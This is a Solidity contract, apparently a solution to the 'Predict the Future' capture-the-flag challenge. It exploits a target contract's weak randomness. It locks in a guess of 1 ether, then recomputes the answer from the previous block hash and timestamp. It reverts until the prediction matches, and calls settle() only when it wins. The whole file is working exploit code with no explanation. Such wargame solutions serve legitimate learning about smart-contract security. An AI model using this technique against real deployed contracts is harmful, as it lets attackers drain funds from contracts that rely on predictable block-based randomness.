pragma solidity ^0.4.22;

import "./PredictTheFutureChallenge.sol";


contract Solution {
    PredictTheFutureChallenge ptfc;
    uint8 GUESS;

    function Solution(PredictTheFutureChallenge _ptfc, uint8 _guess) {
        ptfc = _ptfc;
        GUESS = _guess;
    }

    function lockInGuess() public payable {
        require(msg.value >= 1 ether, "send 1 ether");

        // guess 6
        ptfc.lockInGuess.value(1 ether)(GUESS); // Guess will be 6
    }

    function attack() public {
        uint8 answer = uint8(
            keccak256(block.blockhash(block.number - 1), now)
        ) % 10;
        
        // our guess was 6 so revert if it's not the answer now
        require(answer == GUESS, "nope try again");

        ptfc.settle();
    }

    function() public payable {}
}
